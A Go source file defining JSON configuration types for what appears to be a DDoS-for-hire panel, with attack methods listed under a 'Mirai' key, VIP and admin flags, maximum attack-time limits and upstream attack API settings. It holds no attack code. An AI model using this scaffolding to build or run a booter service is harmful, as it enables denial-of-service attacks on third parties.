package meta

type Attack struct {
        Attacks []struct {
                Name        string   `json:"Name"`
                MethodName  string   `json:"AttackName"`
                Description string   `json:"Description"`

                Moderation struct {
                        LimitMaxTime bool `json:"LimitMaxTime"`
                        MaxTimeAllow int `json:"MaxTime"`
                } `json:"moderation"`

                DefaultPort string `json:"DefaultPort"`
                AdminMethod bool     `json:"AdminMethod"`
                VipMethod   bool   `json:"VipMethod"`
        } `json:"Mirai"`
}

type AttackMethod struct {
        Methods []MethodSep `json:"methods"`
}

type MethodSep struct {
        API_Name string `json:"api_name"`
        UrlEncode bool `json:"urlEncode"`
        Target string `json:"target"`
        Methods []string `json:"attack_methods"`

        CustomDefine []CSMDefine `json:"custom_define"`
}

type CSMDefine struct {
        Method string `json:"method"`
        Description string `json:"description"`
        DefaultPort int `json:"default_port"`
        VIPMethod bool `json:"vip_method"`
}
